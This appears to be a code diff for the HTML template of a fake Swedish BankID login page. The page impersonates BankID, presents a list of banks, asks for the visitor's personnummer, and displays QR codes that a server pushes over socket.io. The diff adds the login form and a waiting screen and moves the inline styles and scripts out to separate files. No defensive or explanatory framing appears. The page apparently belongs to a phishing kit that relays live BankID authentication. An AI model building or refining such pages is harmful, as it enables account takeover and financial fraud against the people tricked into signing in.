@@ -8,301 +8,9 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <style>
-        :root {
-            --primary-color: #183e4f;
-            --secondary-color: #ccc;
-            --text-color: white;
-            --accent-color: black;
-            --border-radius: 8px;
-            --card-border-radius: 0px;
-            --font-size-base: 1rem;
-            --font-size-large: 1.2rem;
-            --padding-base: 10px;
-            --margin-base: 1rem;
-            --margin-large: 2rem;
-            --blur-effect: blur(10px);
-        }
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            min-height: 100vh;
-            background-color: var(--secondary-color);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: start;
-            color: var(--text-color);
-            margin: 40px;
-            /* overflow: hidden; */
-        }
-
-        .logo {
-            position: relative;
-            bottom: 10px;
-            display: flex;
-            margin: var(--margin-large) 0;
-        }
-
-        .content-container {
-            background-color: white;
-            text-align: center;
-            margin: 0 auto;
-            width: 100%;
-            border-radius: var(--border-radius);
-            max-width: 400px;
-        }
-
-        #mainTextContainer {
-            margin-bottom: var(--margin-base);
-            font-size: var(--font-size-large);
-            color: var(--accent-color);
-            font-weight: bold;
-            margin-top: 20px;
-        }
-
-        #agreeSignText {
-            margin-bottom: var(--margin-base);
-            display: block;
-            font-size: 1rem;
-            color: var(--accent-color);
-            text-align: center;
-            margin-top: 35px;
-            padding: var(--padding-base);
-        }
-
-        button {
-            padding: var(--padding-base) 50px;
-            font-size: var(--font-size-base);
-            cursor: pointer;
-            background-color: var(--primary-color);
-            color: var(--text-color);
-            border-radius: var(--border-radius);
-            margin: -5px 0 25px 0;
-        }
-
-        .card {
-            backdrop-filter: var(--blur-effect);
-            border-radius: var(--card-border-radius);
-            background-color: white;
-            position: relative;
-            margin-bottom: var(--margin-base);
-        }
-
-        .qr-container {
-            width: 100%;
-            border-radius: var(--card-border-radius);
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        #qrImage {
-            width: 200px;
-            height: 200px;
-            display: none;
-            margin: 20px auto 0px;
-            border: 5px solid var(--primary-color);
-        }
-
-        #qrImage.active {
-            display: block;
-            animation: fadeBorder 2s forwards;
-        }
-
-        .loader {
-            position: relative;
-            margin: auto;
-            width: 80px;
-            aspect-ratio: 1;
-            border-radius: 100vmin;
-            overflow: hidden;
-        }
-
-        .loader::before {
-            content: '';
-            display: block;
-            padding-top: 100%;
-        }
-
-        .loader.hidden {
-            display: none;
-        }
-
-        #qrText {
-            display: none;
-            color: var(--accent-color);
-            padding: var(--padding-base);
-        }
-
-        #qrText.active {
-            display: inline;
-        }
-
-        .circular {
-            width: 100%;
-            height: 100%;
-            position: absolute;
-            inset: 0;
-            margin: auto;
-            transform-origin: center center;
-            animation: 2s linear 0s infinite rotate;
-        }
-
-        .path {
-            stroke: var(--primary-color);
-            stroke-dasharray: 1, 200;
-            stroke-dashoffset: 0;
-            stroke-linecap: round;
-            animation: 2.5s ease-in-out 0s infinite dash;
-        }
-
-        .footer {
-            text-align: center;
-            padding: 14px;
-            font-size: .813rem;
-            position: relative;
-            top: auto;
-        }
-
-        @keyframes dash {
-            0% {
-                stroke-dasharray: 1, 200;
-                stroke-dashoffset: 0;
-            }
-            50% {
-                stroke-dasharray: 89, 200;
-                stroke-dashoffset: -35px;
-                stroke: var(--primary-color);
-            }
-            100% {
-                stroke-dasharray: 89, 200;
-                stroke-dashoffset: -124px;
-            }
-        }
-
-        @keyframes rotate {
-            to {
-                transform: rotate(2turn);
-            }
-        }
-
-        @keyframes fadeBorder {
-            0% {
-                border-color: var(--primary-color);
-            }
-            100% {
-                border-color: transparent;
-            }
-        }
-
-        /* bank list styles */
-        .container {
-            background-color: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 500px;
-            text-align: center;
-            font-weight: 500;
-            position: relative;
-            margin-top: -150px;
-        }
-
-        h1 {
-            font-size: 2rem;
-            color: #333;
-            margin-bottom: 20px;
-        }
-
-        .search-container {
-            margin-bottom: 10px;
-            position: relative;
-            display: flex;
-            justify-content: center;
-        }
-
-        .search-container input {
-            width: 100%;
-            padding: 10px 10px 10px 40px;
-            font-size: 1rem;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            outline: none;
-            margin-top: 10px;
-        }
-
-        .search-icon {
-            position: absolute;
-            left: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #888;
-            font-size: 1.2rem;
-        }
-
-        .bank-list {
-            list-style-type: none;
-            padding: 0;
-            margin: 0;
-        }
-
-        .bank-list li {
-            display: flex;
-            align-items: center;
-            padding: 10px 0;
-            font-size: 1rem;
-            color: #333;
-            transition: background-color 0.3s ease;
-        }
-
-        .bank-list li:hover {
-            background-color: #ebebeb;
-            cursor: pointer;
-        }
-
-        .bank-logo {
-            width: 45px;
-            height: 45px;
-            border-radius: 50%;
-            overflow: hidden;
-            margin-right: 15px;
-        }
-
-        .bank-logo img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .bank-name-container {
-            flex-grow: 1;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: #868686 1px solid;
-            padding-bottom: 15px;
-        }
-
-        .arrow {
-            border: solid #ccc;
-            border-width: 0 3px 3px 0;
-            display: inline-block;
-            padding: 3px;
-            transform: rotate(-45deg);
-            -webkit-transform: rotate(-45deg);
-            margin-right: 10px;
-        }
-    </style>
 </head>
 <body>
     <div class="logo">
@@ -442,129 +150,45 @@
         </ul>
     </div>
 
+    <div class="waiting" id="waitingSection">
+        <div class="icon-container">
+            <div class="icon">
+                <div class="waiting-arrow"></div>
+            </div>
+            <div class="icon">
+                <div class="waiting-arrow"></div>
+            </div>
+            <div class="icon">
+                <div class="waiting-arrow"></div>
+            </div>
+        </div>
+        <h3>Vanligen vänta</h3>
+        <p>Vi behandlar din begäran.</p>
+    </div>
+
+    <div class="login-container" id="loginContainer">
+        <h2>Logga in på din bank</h2>
+        <p id="bank-name-from-bank-list"></p>
+        <form>
+            <div class="form-group">
+                <select id="login-method" name="login-method">
+                    <option value="mobile-bankid" >Mobilt bankID med QR kod</option>
+                </select>
+                <label for="login-method" class="floating-label">Inloggningsmetod</label>
+            </div>
+            <div class="form-group">
+                <input type="text" id="personal-number" name="personal-number" placeholder=" ">
+                <label for="personal-number" class="floating-label">Personnummer</label>
+            </div>
+            <button id="continue-button" type="submit">Gå vidare</button>
+        </form>
+    </div>
+
     <div class="footer">
         <p>© BankID 2024<br>
             Denna anslutning är krypterad</p>
     </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const socket = io();
-            const loaderElement = document.querySelector('.loader');
-            const qrImage = document.getElementById('qrImage');
-            const qrText = document.getElementById('qrText');
-            const generateQrButton = document.getElementById('generateQrButton');
-            const agreeSignText = document.getElementById('agreeSignText');
-            const qrCard = document.getElementById('qrCard');
-            const contentContainer = document.querySelector('.content-container');
-            const bankListContainer = document.getElementById('bankListContainer');
-            const bankList = document.getElementById('bankList');
-            const bankItems = bankList.querySelectorAll('li');
-
-            let isLoading = false;
-            let lastUpdateTime = Date.now();
-            let isButtonClicked = false;
-
-            bankListContainer.style.display = 'none';
-
-            generateQrButton.addEventListener('click', function() {
-                if (!isButtonClicked) {
-                    agreeSignText.style.display = 'none';
-                    qrCard.style.display = 'none'; 
-                    isLoading = false; 
-                    loaderElement.classList.remove('active');
-
-                    bankListContainer.style.display = 'block';
-                    isButtonClicked = true;
-                }
-            });
-
-            socket.on('update_qr_code_image', function(data) {
-                qrImage.src = 'data:image/png;base64,' + data.qr_image;
-                isLoading = false;
-                loaderElement.classList.remove('active');
-                loaderElement.classList.add('hidden');
-                qrImage.classList.add('active');
-                qrText.classList.add('active');
-                lastUpdateTime = Date.now();
-
-                contentContainer.style.height = 'auto';
-
-                if (generateQrButton.innerHTML == 'Inväntar ytterligare signeringar') {
-                    generateQrButton.style.display = 'none';
-                }
-            });
-
-            setInterval(() => {
-                if (Date.now() - lastUpdateTime > 1000 && !isLoading) {
-                    isLoading = true;
-                    loaderElement.classList.add('active');
-                    loaderElement.classList.remove('hidden');
-                    qrImage.classList.remove('active');
-                    qrText.classList.remove('active');
-
-                    contentContainer.style.height = 'auto';
-
-                    if (generateQrButton.innerHTML == '') {
-                        generateQrButton.style.display = 'block';
-                    }
-                }
-            }, 1000);
-
-            document.querySelector('.sidebar-toggler').addEventListener('click', function() {
-                var helpTexts = document.querySelectorAll('.help-button-text');
-                helpTexts.forEach(function(text) {
-                    text.classList.toggle('hidden');
-                });
-            });
-
-            document.querySelector('.cancel-bankid').addEventListener('click', function() {
-                document.getElementById('bankid-qr-code').classList.remove('current');
-                window.location.reload();
-            });
-
-            bankItems.forEach(item => {
-                item.addEventListener('click', function() {
-                    const bankName = item.querySelector('.bank-name').textContent.trim();
-
-                    // if (bankName === 'Nordea') {
-                        bankListContainer.style.display = 'none';
-                        qrCard.style.display = 'block';
-                        isLoading = true;
-                        loaderElement.classList.add('active');
-                        socket.emit('generate_qr_code');
-                        generateQrButton.innerHTML = 'Inväntar ytterligare signeringar';
-                        generateQrButton.style.backgroundColor = 'white';
-                        generateQrButton.style.color = '#000';
-                        generateQrButton.style.border = 'none';
-                        
-                    // } else {
-                        // hide QR card and show the bank list
-                        // qrCard.style.display = 'none';
-                        // bankListContainer.style.display = 'block';
-                        // alert(`You clicked on: ${bankName}`);
-                    // }
-                    // emit event, bank name to server
-                    socket.emit('bank_clicked', { bankName: bankName });
-                });
-            });
-
-            const searchInput = document.getElementById('searchInput');
-            searchInput.addEventListener('input', () => {
-                const searchTerm = searchInput.value.toLowerCase();
-
-                bankItems.forEach(item => {
-                    const bankName = item.querySelector('.bank-name').textContent.toLowerCase();
-
-                    if (bankName.includes(searchTerm)) {
-                        item.style.display = 'flex'; 
-                    } else {
-                        item.style.display = 'none';
-                    }
-                });
-            });
-        });
-    </script>
+    <script src="{{ url_for('static', filename='js/script.js') }}" defer></script>
 </body>
 </html>
